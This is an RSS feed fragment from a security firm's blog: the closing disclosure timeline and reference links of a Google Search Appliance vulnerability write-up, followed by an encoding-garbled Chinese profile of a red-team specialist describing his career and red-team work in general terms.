    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/11/09&lt;/td&gt;
      &lt;td&gt;GSA 7.6.250.G12 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/12/28&lt;/td&gt;
      &lt;td&gt;The final date to order GSA.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/01/17&lt;/td&gt;
      &lt;td&gt;GSA 7.6.250.G20 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/03/21&lt;/td&gt;
      &lt;td&gt;GSA 7.6.250.G26 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/06/15&lt;/td&gt;
      &lt;td&gt;GSA 7.6.360.G10 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/10/08&lt;/td&gt;
      &lt;td&gt;GSA 7.6.360.G16 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2019/04/26&lt;/td&gt;
      &lt;td&gt;GSA 7.6.512.G18 released. It should be the last publicly released version.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/16&lt;/td&gt;
      &lt;td&gt;issues reported.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/16&lt;/td&gt;
      &lt;td&gt;replied from a bot, and triaged.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/16&lt;/td&gt;
      &lt;td&gt;issuetracker.google.com assigned a issue.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/18&lt;/td&gt;
      &lt;td&gt;Google said issue is not severe enough to qualify for a reward, but VRP panel will take a closer look.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/20&lt;/td&gt;
      &lt;td&gt;VRP panel has decided that the security impact of this issue does not meet the bar for a financial reward.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/11/01&lt;/td&gt;
      &lt;td&gt;Asking if a vulnerability will be assigned a CVE identifier.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/11/02&lt;/td&gt;
      &lt;td&gt;Confirming that a CVE identifier will not be assigned.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;early 2023&lt;/td&gt;
      &lt;td&gt;Started writing this article&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2023/06/04&lt;/td&gt;
      &lt;td&gt;First draft completed.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;Although the GSA/vGSA is a product that has reached the end of its lifecycle, 
studying how Google increases product security and reduces attack vectors for devices can broaden our knowledge,
which we might not usually come into contact with. 
Although it is not detailed in this article, the Java Security Manager and the Linux Kernelâ€™s seccomp are both technologies used in the GSA, 
and this research has also left some goals for further study:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The feedergate service listening on port 19900.&lt;/li&gt;
  &lt;li&gt;Memory vulnerabilities in Oracleâ€™s Outside-in Technology for converting file formats.&lt;/li&gt;
  &lt;li&gt;The convert_to_html seccomp sandbox&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We will share when there are some research results, See you next time.&lt;/p&gt;

&lt;h3 id=&quot;other-reference-links&quot;&gt;Other reference links&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&quot;&gt;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/&quot;&gt;https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/1333&quot;&gt;https://www.exploit-db.com/exploits/1333&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&quot;&gt;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.anandtech.com/show/2407&quot;&gt;https://www.anandtech.com/show/2407&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&quot;&gt;https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/google/subpar&quot;&gt;https://github.com/google/subpar&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&quot;&gt;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/57760#issuecomment-356466614&quot;&gt;https://github.com/kubernetes/kubernetes/issues/57760#issuecomment-356466614&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2014-0362&quot;&gt;https://nvd.nist.gov/vuln/detail/CVE-2014-0362&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2023/07/07/a-journey-into-hacking-google-search-appliance-en/</link>
                <guid>https://devco.re/blog/2023/07/07/a-journey-into-hacking-google-search-appliance-en</guid>
                <pubDate>Fri, 07 Jul 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>å¾è³‡å®‰éº»ç“œåˆ°ç´…éšŠæ¼”ç·´å°ˆå®¶ï¼Vtim</title>
                <description>&lt;p&gt;ã€Œæåˆ°é§­å®¢ï¼Œä½ æœƒæƒ³åˆ°èª°ï¼Ÿæ˜¯ã€Šé§­å®¢ä»»å‹™ã€‹çš„å°¼æ­ã€ V æ€ªå®¢ã€ã€Šçœ‹è‡‰æ™‚ä»£ã€‹è£¡çš„å°è·¯ã€é‚„æ˜¯æ©˜å­ï¼Ÿã€ç´…éšŠæ¼”ç·´å°ˆå®¶ Vtim ç¬‘è‘—å•é“ã€‚&lt;/p&gt;

&lt;p&gt;ç›®å‰æ–¼ DEVCORE æˆ´å¤«å¯‡çˆ¾æ“”ä»»ç´…éšŠæ¼”ç·´å°ˆå®¶çš„ Vtimï¼Œç¾å¹´ 27 æ­²ï¼Œæ›¾å¸¶é ˜éå¤šæ¬¡ç´…éšŠæ¼”ç·´å°ˆæ¡ˆï¼Œæ“æœ‰æ•¸åå ´ç´…éšŠæ¼”ç·´ç¶“é©—ï¼Œä¹Ÿæœ‰è±å¯Œçš„è³‡å®‰ç«¶è³½åŠåœ‹éš›ä¼æ¥­æ¼æ´çå‹µè¨ˆç•«ç¶“é©—ï¼Œäº¦é€šé OSCPã€OSWE èªè­‰ï¼Œå…·å‚™å°ˆæ¥­çš„ Web æª¢æ¸¬èˆ‡å…§ç¶²æ»²é€èƒ½åŠ›ã€‚ã€Œæˆ‘å…¶ä»–èº«ä»½æ˜¯æ¼æ´è³é‡‘çµäººè·Ÿæ¥­é¤˜ CTF ç©å®¶ï¼ã€Vtimèªªã€‚&lt;/p&gt;

&lt;h3 id=&quot;ctf-æ„å¤–å¾—å--å¾æ­¤èµ°ä¸Šè³‡å®‰è·¯&quot;&gt;CTF æ„å¤–å¾—å  å¾æ­¤èµ°ä¸Šè³‡å®‰è·¯&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230526/1.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;å¤§å­¸å‰å…©å¹´ï¼ŒVtim çš„èª²å¾Œæ´»èºåº¦é é«˜æ–¼èª²å ‚æ´»èºåº¦ã€‚&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;ã€Œå¥½åƒå¾ˆå¤šäººè¦ºå¾—é§­å®¢å°±æ˜¯æ•²æ•²éµç›¤å°±èƒ½å…¥ä¾µäº†ï¼Ÿä½†å…¶å¯¦ç•¶é§­å®¢è¦å­¸çš„æ±è¥¿å¯¦åœ¨å¤ªå¤šäº†ï¼ã€Vtim é‚Šèªªé‚Šå±•ç¤ºäº†ä¸€å¼µå¯†å¯†éº»éº»çš„è³‡å®‰è­‰ç…§åœ–ï¼Œæœ€ä¸Šé¢çš„å°å­—å‰‡å¯«è‘—ã€Œ356 ç¨®è­‰ç…§ã€ã€‚å¤§å­¸æ™‚æœŸå°±è®€æ–¼åœ‹ç«‹æˆåŠŸå¤§å­¸è³‡è¨Šå·¥ç¨‹å­¸ç³»çš„ Vtimï¼Œå¦è¨€è‡ªå·±å¤§å­¸å‰å…©å¹´åŸºæœ¬ä¸Šéƒ½åœ¨ç¿¹èª²è€å»¢ã€å¿™è‘—è·‘æ´»å‹•è·Ÿæ‰“é›»å‹•ï¼Œç›´åˆ°å¤§ä¸‰æ‰é–‹å§‹å¥½å¥½åŠªåŠ›ã€å¤©å¤©å‘ä¸Šï¼Œé–’è‘—æ²’äº‹å°±åˆ·æ¼”ç®—æ³•é¡Œï¼Œå¤§å››æš‘å‡æŸå¤©ï¼Œå®¤å‹éš¨å£å•ä»–è¦ä¸è¦ä¸€èµ·åƒåŠ ã€ŒAIS3 æ–°å‹æ…‹è³‡å®‰æš‘æœŸèª²ç¨‹ã€ï¼Œæ²’æœ‰å¤šæƒ³çš„ä»–éš¨å£ç­”æ‡‰å¾Œï¼Œæ‰å¾—çŸ¥å ±åå‰è¦å…ˆè€ƒã€ŒCTF (Capture the Flag) pre-examã€ã€‚åœ¨æ­¤ä¹‹å‰é€£ã€ŒXSSã€ã€ã€ŒSQL Injectionã€éƒ½ä¸€å•ä¸‰ä¸çŸ¥çš„ä»–ï¼Œç«Ÿæ„å¤–åœ°æ‹¿ä¸‹äº†ç¬¬å››åï¼Œè‡ªæ­¤é–‹å•Ÿäº†ä»–å°è³‡å®‰çš„èˆˆè¶£ã€‚&lt;/p&gt;

&lt;p&gt;å¤§å››ä¸‹å­¸æœŸï¼ŒVtim å¯èµ·ä¾†æ‰¾ç·šä¸Šè³‡å®‰èª²ç¨‹è‡ªå­¸ï¼Œå­¸ç¿’å„ç¨®å…¥ä¾µç³»çµ±çš„åŸç†ä»¥åŠæ”»æ“Šæ‰‹æ³•ï¼Œèˆ‡æ­¤åŒæ™‚ï¼Œå®¤å‹å‰‡æ²‰è¿·æ–¼ LOL è‹±é›„è¯ç›Ÿï¼Œç‚ºäº†æ¶ˆé™¤æƒ±äººçš„èƒŒæ™¯å™ªéŸ³ï¼ŒVtim è©¦è‘—ä»¥é§­å®¢çš„æ–¹å¼æ–·äº†å®¤å‹ç¶²è·¯ã€‚ã€Œçµæœä»–å€‘å°±æ›´åµäº†â€¦â€¦ä¸€ç›´åœ¨å“€åšï¼ã€ä»–ç¬‘é“ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œä»–ä¹Ÿé–‹å§‹è©¦è‘—è‡ªå·±æ‰“å„ç¨® CTF ç·šä¸Šæ¯”è³½ã€‚ç‰¹åˆ¥çš„æ˜¯ï¼Œä»–æ²’æœ‰åƒå…¶ä»–äººä¸€æ¨£çµ„éšŠåƒè³½ç´¯ç©æ›´å¤šåˆ†æ•¸ï¼Œè€Œæ˜¯ä¸€å€‹äººæ‘¸ç´¢ã€å­¸ç¿’åˆ¥äººçš„è§£é¡Œæ€è·¯ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230526/2.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;Vtim å¤§å››ä¸‹å­¸æœƒæ–·å®¤å‹ç¶²è·¯æ™‚ä½¿ç”¨çš„ç„¡ç·šç¶²å¡ã€‚&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&quot;æ¼æ´çå‹µæ¼æ´æ¯”è³½å¯¦æˆ°è­‰ç…§ä¸€æŠŠç½©&quot;&gt;æ¼æ´çå‹µã€æ¼æ´æ¯”è³½ã€å¯¦æˆ°è­‰ç…§ä¸€æŠŠç½©&lt;/h3&gt;

&lt;p&gt;å¤§å­¸ç•¢æ¥­å¾Œï¼ŒVtim é€²å…¥åœ‹ï§·è‡ºç£ç§‘æŠ€å¤§å­¸è³‡è¨Šç®¡ç†ç³»ç ”ç©¶æ‰€è³‡è¨Šå®‰å…¨å¯¦é©—å®¤ï¼Œç”±å³å®—æˆæ•™æˆæŒ‡å°ã€‚ç¢©å£«æ™‚æœŸï¼ŒVtim é †åˆ©é€šéå¾µé¸ï¼Œé€£çºŒæˆç‚ºæ•™è‚²éƒ¨ã€Œè³‡å®‰äººæ‰åŸ¹è‚²è¨ˆç•«ï¼è³‡å®‰å¯¦å‹™å°å¸«åˆ¶åº¦ï¼è‡ºç£å¥½å²é§­ã€å…©å±†åŸ¹è¨“å­¸å“¡ï¼Œå°å¸«å‰‡åˆ†åˆ¥æ˜¯ DEVCORE çš„åŸ·è¡Œé•·æš¨å…±åŒå‰µè¾¦äºº Allen åŠé¦–å¸­è³‡å®‰ç ”ç©¶å“¡ Orangeï¼ˆåŒæ™‚ä¹Ÿæ˜¯ Vtim åŠè¨±å¤šäººçœ¼ä¸­çš„ã€Œå‚³å¥‡æ»²é€å¸«ã€ï¼‰ï¼Œä¹Ÿåœ¨æ­¤æ™‚èªè­˜äº†è¨±å¤šé§­å®¢å¤§ç¥ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œä»–ä¹Ÿé–‹å§‹å˜—è©¦ç ´è§£é¶æ©Ÿé¡å‹çš„é¡Œç›®ï¼Œæ‹“å±•åŸæœ¬åƒ…é™æ–¼ CTF çš„è§£é¡Œé¡Œå‹ã€‚&lt;/p&gt;

&lt;p&gt;åŒä¸€æ™‚é–“ï¼ŒVtim ä¹Ÿé€²å…¥äº†è³‡å®‰å…¬å¸å¯¦ç¿’ï¼Œä¸»è¦è² è²¬æ»²é€æ¸¬è©¦çš„åŸ·è¡Œã€‚ä¹Ÿæ˜¯åœ¨å¯¦ç¿’å¾Œï¼Œä»–æ‰æ˜é¡¯æ„Ÿå—åˆ°ä¼æ¥­çœŸå¯¦ç’°å¢ƒèˆ‡ç·šä¸Šæ¯”è³½çš„å·®ç•°ï¼Œä¾‹å¦‚ä¼æ¥­ä¸åƒé¶æ©Ÿä¸€å®šæœ‰æ´ã€æŒ‡å®šæ»²é€çš„ç³»çµ±ä¸è¦‹å¾—ç†Ÿæ‚‰ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œå¦‚ä½•å°‡æ¸¬è©¦æ™‚çš„ç™¼ç¾è½‰æ›ç‚ºä¼æ¥­å¯ç†è§£çš„å ±å‘Šï¼Œä¹Ÿæ˜¯å¹³æ™‚è‡ªå­¸æ™‚å°‘æœ‰æ©Ÿæœƒå­¸ç¿’çš„æŠ€èƒ½ã€‚&lt;/p&gt;

&lt;p&gt;ç‚ºäº†è­‰æ˜è‡ªå·±æ‰€å­¸çš„åƒ¹å€¼ï¼ŒVtim é–‹å§‹åƒèˆ‡æ¼æ´çå‹µè¨ˆç•«ï¼Œä¸¦æˆåŠŸç™¼ç¾ LINE çš„æ¼æ´ï¼Œå–å¾—äººç”Ÿä¸­é¦–æ¬¡æ¼æ´çå‹µçš„æˆå°±ï¼Œç²å¾—äº† 1,000 ç¾é‡‘çš„çå‹µã€‚èˆ‡æœ‹å‹çµ„éšŠåƒåŠ æ¼æ´æŒ–æ˜ç«¶è³½ï¼Œä¹Ÿé †åˆ©å¥ªå† ã€‚é¦–æ¬¡å˜—è©¦æŒ‘æˆ° OSCP ï¼ˆOffensive Security Certified Professionalï¼‰å¯¦æˆ°å‹è­‰ç…§ï¼Œå³é †åˆ©é€šéã€‚Vtim è£œå……ï¼Œè€ƒç”Ÿé ˆåœ¨ 24 å°æ™‚æ‰“ä¸‹ 5 å°æ©Ÿå™¨ï¼Œå†èŠ± 24 å°æ™‚å¯«ä¸€ä»½æ»²é€æ¸¬è©¦å ±å‘Šï¼Œæ˜¯éå¸¸è€ƒé©—é«”åŠ›è·Ÿèƒ½åŠ›çš„ä¸€å¼µè­‰ç…§ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230526/3.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;Vtim é¦–æ¬¡å˜—è©¦æŒ‘æˆ° OSCP å¯¦æˆ°å‹è­‰ç…§ï¼Œå³é †åˆ©é€šéã€‚&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&quot;åŒäº‹å¼·åˆ°ä¸ç¦æ‡·ç–‘äººç”Ÿ--ç¬¬ä¸€ç·šå­¸é«˜æ‰‹æ€è·¯ä¸æ–·æˆé•·&quot;&gt;åŒäº‹å¼·åˆ°ä¸ç¦æ‡·ç–‘äººç”Ÿ  ç¬¬ä¸€ç·šå­¸é«˜æ‰‹æ€è·¯ä¸æ–·æˆé•·&lt;/h3&gt;

&lt;p&gt;å› ç‚ºã€Œæ‰€æœ‰æŠ€èƒ½é»éƒ½é»åœ¨æ”»æ“Šã€ï¼ŒVtim åœ¨ç ”ç©¶æ‰€ç•¢æ¥­å¾Œï¼Œå°‹æ‰¾çš„ä¹Ÿæ˜¯æ”»æ“Šæ¸¬è©¦ç›¸é—œå·¥ä½œã€‚è©•ä¼°éå¾Œï¼Œå±¥æ­·åªæŠ•äº† DEVCOREã€‚ã€Œç•¶æ™‚æ‰“ CTF æ™‚å¾ˆå´‡æ‹œ Orange è·Ÿ Angelboyï¼Œç™¼ç¾ä»–å€‘éƒ½åœ¨ DEVCOREï¼Œå°±è¦ºå¾—é€™é–“å…¬å¸æ‡‰è©²æ˜¯å°ç£é§­å®¢æŠ€è¡“æœ€é ‚å°–çš„ï¼Œä¹Ÿå¸Œæœ›èƒ½åŠ å…¥å¢å¼·è‡ªå·±çš„å¯¦åŠ›ï¼ã€ä»–å›æ†¶ã€‚&lt;/p&gt;

&lt;p&gt;éäº”é—œæ–¬å…­å°‡å¾Œï¼ŒVtim ä»¥ç´…éšŠæ¼”ç·´å°ˆå®¶çš„èº«ä»½åŠ å…¥ DEVCOREã€‚ã€Œä¸€é–‹å§‹å…¶å¯¦è »æŒ«æŠ˜çš„ï¼Œå› ç‚ºè‡ªå·±å¤ªç¼ºä¹å¾Œæ»²é€éœ€è¦çš„çŸ¥è­˜ï¼Œç¶“é©—ä¹Ÿä¸è¶³ã€‚ã€Vtim èªªï¼Œè‡ªå·±åŸæœ¬æ‰€å­¸åƒ…æ˜¯å–®ç´”æ‰“ä¸‹ä¸»æ©Ÿï¼Œä½†å¯¦éš›æ‰“ä¸‹ä¸»æ©Ÿå¾Œæ€éº¼ç¹éé˜²æ¯’è»Ÿé«”ã€EDRã€æ©«å‘ç§»å‹•ã€å…§ç¶²æ»²é€ï¼Œéƒ½æ˜¯æœ¬ä¾†åœ¨æ‰“é¶æ©Ÿé¡Œç›®è¼ƒå°‘å­¸åˆ°çš„æ‰‹æ³•ã€‚æ­¤å¤–ï¼ŒæŠ€è¡“å¼·å¤§çš„åŒäº‹ç¾¤ï¼Œä¹Ÿè®“ä»–ä¸ç¦æ‡·ç–‘èµ·è‡ªå·±çš„èƒ½åŠ›ã€‚&lt;/p&gt;

&lt;p&gt;ä½† Vtim ä¸¦æœªå› æŒ«æŠ˜æ„Ÿè€Œæ”¾æ£„ï¼Œç›¸ååœ°ï¼Œæ†‘è‘—å°æŠ€è¡“çš„ç†±æƒ…ï¼Œä¸æ–·å­¸ç¿’é«˜æ‰‹å€‘çš„æ€è·¯ï¼Œä»–ä¹Ÿä¸æ–·æˆé•·ï¼Œè®“è‡ªå·±è¶Šä¾†è¶Šå¼·å¤§ã€‚ã€Œé‡åˆ°å›°é›£æ™‚ï¼Œæˆ‘æœƒæƒ³åƒé€™äº›äººæœƒæ€éº¼åšï¼Œè—‰æ­¤èª¿æ•´è‡ªå·±çš„å¿ƒæ…‹å’Œæ€è·¯ï¼Œåœ¨é¢å°å•é¡Œæ™‚ä¸è‡³æ–¼æ²’æœ‰æ–¹å‘æˆ–é©šæ…Œå¤±æªã€‚ã€ä»–ç”±è¡·åœ°èªªã€‚DEVCORE çš„å‰è¼©å€‘ä¹Ÿç›¸ç•¶æ¨‚æ–¼åˆ†äº«ï¼Œè®“ä»–é€æ¼¸æ‰¾å‡ºè§£æ±ºå•é¡Œçš„æ–¹æ³•ï¼Œä¹Ÿåœ¨çœ¾å¤šé«˜æ‰‹çš„åˆºæ¿€ä¸‹ï¼Œä¸æ–·ç²¾é€²è‡ªå·±ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230526/4.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;Vtimï¼ˆå¾Œæ’å·¦äºŒï¼‰èˆ‡åŒäº‹æ–¼ DEVCORE å……é›»é€±å¯†å®¤é€ƒè„«ï¼Œè¨“ç·´è§£é¡Œèƒ½åŠ›ã€‚&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&quot;ç´…éšŠæ¼”ç·´æˆæœ¬é«˜--é§­å®¢å°ˆæ”»ç¶²è·¯é‚Šç•Œ&quot;&gt;ç´…éšŠæ¼”ç·´æˆæœ¬é«˜  é§­å®¢å°ˆæ”»ç¶²è·¯é‚Šç•Œ&lt;/h3&gt;

&lt;p&gt;ã€Œç´…éšŠæ¼”ç·´ã€å°å¾ˆå¤šäººè€Œè¨€é‚„æ˜¯ç›¸ç•¶é™Œç”Ÿï¼ŒVtim è§£é‡‹ï¼Œç´…éšŠæ¼”ç·´å…¶å¯¦æ˜¯æ¼æ´æª¢æ¸¬æœå‹™çš„ä¸€ç¨®ï¼Œæ¼æ´æª¢æ¸¬æœå‹™å¯åˆ†ç‚ºå¼±é»æƒæã€æ»²é€æ¸¬è©¦ã€ç´…éšŠæ¼”ç·´ï¼Œå…¶ä¸­ç´…éšŠæ¼”ç·´æ˜¯æ¸¬è©¦ç¯„åœæœ€å…¨é¢ã€æœ€è²¼è¿‘ç¾å¯¦é§­å®¢æ”»æ“Šæ‰‹æ³•ï¼Œä¸”èƒ½ç™¼ç¾ç‡Ÿé‹å±¤é¢ç¼ºå¤±ä¸¦æª¢è¦–æ•´é«”è³‡å®‰é˜²ç¦¦æ©Ÿåˆ¶ï¼Œå› æ­¤ç´…éšŠæ¼”ç·´æ‰€éœ€çš„äººåŠ›é–€æª»æ›´é«˜ã€ä½¿ç”¨è³‡æºæ›´å¤šï¼Œæˆæœ¬ä¹Ÿæ˜¯ä¸‰è€…æœ€é«˜çš„ã€‚&lt;/p&gt;

&lt;p&gt;è‹¥è¦ä»¥ä¸€å¥è©±è§£é‡‹ç´…éšŠæ¼”ç·´ï¼Œå³æ˜¯ä¼æ¥­å§”ä»»å°ˆæ¥­ç´…éšŠåœ˜éšŠï¼Œè¨­æ³•é€éå„ç¨®æ–¹å¼ã€ç”šè‡³çµ„åˆå¼çš„æ”»æ“Šæ‰‹æ³•ï¼Œæ¨¡æ“¬å…¥ä¾µä¼æ¥­ï¼Œåœ¨æ™‚é™å…§é”æˆä¼æ¥­æŒ‡å®šä»»å‹™ï¼Œå¦‚å–å¾—æŸå°é›»è…¦çš„æ§åˆ¶æ¬Šæˆ–æ ¸å¿ƒå…§ç¶²çš„æ©Ÿå¯†è³‡æ–™ç­‰ã€‚ä»–å¼·èª¿ï¼Œè¨±å¤šä¼æ¥­å°‡è³‡å®‰é˜²ç¦¦é‡é»æ”¾åœ¨æ ¸å¿ƒç¶²ç«™åŠç³»çµ±ï¼Œå°æ–¼é§­å®¢è€Œè¨€ï¼Œè‹¥æ”»æ“Šé€™é¡é˜²å®ˆåš´å¯†çš„å€å¡Šæˆæœ¬éé«˜ï¼Œå‰‡æœƒå°‡æ”»æ“Šç›®æ¨™è½‰ç§»åˆ°ä¼æ¥­è¼ƒç¶²è·¯é‚Šç•Œä¸­é˜²è­·è¼ƒå¼±çš„ç³»çµ±ã€‚&lt;/p&gt;

&lt;p&gt;è‡³æ–¼å¦‚ä½•å¾æ‰¾å‡ºç¶²è·¯é‚Šç•Œçš„ç³»çµ±é€²è€Œå…¥ä¾µæˆåŠŸï¼Ÿä»–èˆ‰ä¾‹ï¼Œç´…éšŠå·¥ä½œä¸»è¦å¯ä»¥åˆ†æˆå…©å€‹éšæ®µï¼Œåˆ†åˆ¥æ˜¯å–å¾—å¤–ç¶²é€²å…¥é»ä»¥åŠå…§ç¶²æ»²é€ï¼Œä»¥ç¬¬ä¸€éšæ®µçš„å–å¾—å¤–ç¶²é€²å…¥é»è€Œè¨€ï¼Œæ”»æ“Šè€…æœƒå˜—è©¦å„ç¨®æ”»æ“Šæ‰‹æ³•å…¥ä¾µä¼æ¥­å…§ç¶²ï¼Œä¾‹å¦‚çªç ´é˜²å®ˆè¼ƒè–„å¼±çš„ç¶²è·¯é‚Šç•Œä¸»æ©Ÿï¼Œæˆ–å¾ GitHub ç­‰ç·šä¸Šè»Ÿé«”åŸå§‹ç¢¼ä»£ç®¡æœå‹™å¹³å°å°‹æ‰¾ä¼æ¥­æ´©æ¼çš„ç¨‹å¼ç¢¼æˆ–æ©Ÿæ•è³‡è¨Šä»¥åˆ©ç”¨ã€‚æ­¤å¤–ï¼Œäº¦å¯èƒ½å˜—è©¦é€²è¡Œç¤¾äº¤å·¥ç¨‹ï¼Œå¯„é€æ¤å…¥å¾Œé–€ç¨‹å¼çš„é‡£é­šä¿¡ä»¶ï¼Œç”šè‡³å¯¦é«”å‰å¾€ç›®æ¨™å…¬å¸é™„è¿‘é€²è¡Œ WiFi å°åŒ…çš„å´éŒ„åŠç ´è§£ï¼Œå¾…æˆåŠŸé€²å…¥ä¼æ¥­å…§ç¶²å¾Œï¼Œå³é–‹å§‹ç¬¬äºŒéšæ®µçš„å…§ç¶²æ»²é€ï¼Œä¸€æ­¥æ­¥å¾ç¶²è·¯é‚Šç•Œé€²è¡Œæ©«å‘ç§»å‹•ï¼Œæœ€çµ‚å…¥ä¾µåˆ°æ ¸å¿ƒç¶²æ®µï¼Œå–å¾—æ ¸å¿ƒç³»çµ±æ§åˆ¶æ¬Šæˆ–å–å¾—æ©Ÿå¯†è³‡æ–™ï¼Œé”æˆä»»å‹™ç›®æ¨™ã€‚&lt;/p&gt;

&lt;h3 id=&quot;èˆ‡æ–°çŸ¥åŠæ™‚é™è³½è·‘--ç†±æƒ…åŠè§£é¡Œèƒ½åŠ›å¾ˆé‡è¦&quot;&gt;èˆ‡æ–°çŸ¥åŠæ™‚é™è³½è·‘  ç†±æƒ…åŠè§£é¡Œèƒ½åŠ›å¾ˆé‡è¦&lt;/h3&gt;

&lt;p&gt;å°æ–¼é€™å€‹è·ä½çš„æŒ‘æˆ°ï¼ŒVtim èªçœŸæ€è€ƒäº†ä¸€ä¸‹ï¼Œè¡¨ç¤ºèº«ç‚ºç´…éšŠé ˆä¸æ–·èˆ‡æ–°çš„æŠ€è¡“è³½è·‘ï¼Œæ–°çš„çŸ¥è­˜èˆ‡æ¶æ§‹æ—¥æ–°æœˆç•°ï¼Œåªèƒ½ä¸æ–·æŒçºŒå­¸ç¿’èˆ‡çªç ´ã€‚æ­¤å¤–ï¼Œæ¯æ¬¡å°ˆæ¡ˆä¹Ÿéƒ½åœ¨å˜—è©¦çªç ´è‡ªå·±çš„æ¥µé™ï¼Œå¸¸å¸¸é‡åˆ°æ™‚é™è¿«åœ¨çœ‰ç«ä½†å§‹çµ‚æ‰¾ä¸åˆ°é€²å…¥é»ï¼Œæœ€å¾Œæ‰åˆã€Œçµ•è™•é€¢ç”Ÿã€ï¼Œä¹Ÿéœ€è¦æ‰¿å—ä¸€å®šç¨‹åº¦çš„å¿ƒç†å£“åŠ›ã€‚&lt;/p&gt;

&lt;p&gt;ä»–èªç‚ºï¼Œç´…éšŠå°ˆå®¶é™¤äº†æ‡‚æ”»æ“Šï¼Œé‚„è¦æ‡‚å¾—å¦‚ä½•æä¾›å®¢æˆ¶å°ˆæ¥­çš„è³‡å®‰é˜²ç¦¦å»ºè­°ï¼Œéœ€è¦æœ‰ç¶œè§€å…¨å±€çš„èƒ½åŠ›ã€‚ã€Œå°å®¢æˆ¶è€Œè¨€ï¼Œæ”»æ“Šä¸å®Œå…¨æ˜¯é‡é»ï¼Œä»–å€‘æ›´æƒ³çŸ¥é“æ‰¾åˆ°å•é¡Œå¾Œå¦‚ä½•ç·©è§£é¢¨éšªã€‚ã€Vtim è¡¨ç¤ºã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230526/5.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;ä¸‹ç­å¾Œçš„ Vtim é‚„èˆ‡åŒäº‹çµ„æˆæ¨‚åœ˜ï¼Œæ“”ä»» Bass æ‰‹çš„è§’è‰²ã€‚&lt;/em&gt;&lt;/p&gt;

